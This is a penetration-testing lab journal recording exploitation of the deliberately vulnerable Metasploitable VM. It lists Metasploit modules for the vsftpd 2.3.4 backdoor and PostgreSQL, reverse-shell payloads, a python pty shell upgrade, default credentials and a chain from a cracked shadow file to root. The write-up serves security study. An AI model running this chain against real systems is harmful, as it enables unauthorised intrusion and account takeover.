# Day 04 - vsftpd Backdoor & PostgreSQL Privilege Escalation
**Date:** 2026-07-08

## vsftpd 2.3.4 Backdoor (Port 21)
### Exploitation
- Module: exploit/unix/ftp/vsftpd_234_backdoor
- Payload: cmd/unix/reverse_netcat
- RHOSTS: 192.168.100.10, LHOST: 192.168.100.20
- Got clean root shell: uid=0(root)

### Key Lesson
Previous attempts failed due to wrong payload (meterpreter too complex
for this simple backdoor) and stale sessions. Using cmd/unix/reverse_netcat
instead of the default meterpreter payload resolved both issues.

## PostgreSQL Command Execution → Root (Port 5432)
### Exploitation
- Logged in with cracked credentials: postgres:postgres
- Module: exploit/linux/postgres/postgres_payload
- Payload: linux/x86/shell_reverse_tcp (meterpreter died on 32-bit target)
- Changed LPORT to 4445 (4444 still occupied from previous session)
- Got shell as postgres user (not root — realistic service account privilege)

### Privilege Escalation
- Shell too basic for su — upgraded with:
  python -c 'import pty; pty.spawn("/bin/bash")'
- Switched to msfadmin using credentials cracked from NFS shadow file
- sudo su with msfadmin password → root@metasploitable

### Key Lesson
Database service accounts rarely run as root. Getting a shell as postgres
required a second step — privilege escalation using credentials gathered
from an earlier attack (NFS shadow file crack). This is realistic attack
chaining: one finding enabling another.

## Attack Chain Summary
NFS misconfiguration → shadow file read → John cracks postgres:postgres
→ PostgreSQL shell → python pty upgrade → su msfadmin → sudo su → root

## Progress So Far
- Port 1524: root shell, no auth (Day 02)
- Port 23 (telnet): default creds (Day 02)
- NFS: mounted root filesystem, cracked shadow file (Day 03)
- Samba 3.0.20 CVE-2007-2447: command injection, root shell (Day 03)
- Port 21 (vsftpd 2.3.4): backdoor, root shell (Day 04)
- Port 5432 (PostgreSQL): service shell → privilege escalation → root (Day 04)

## Remaining
- ProFTPD (port 2121)
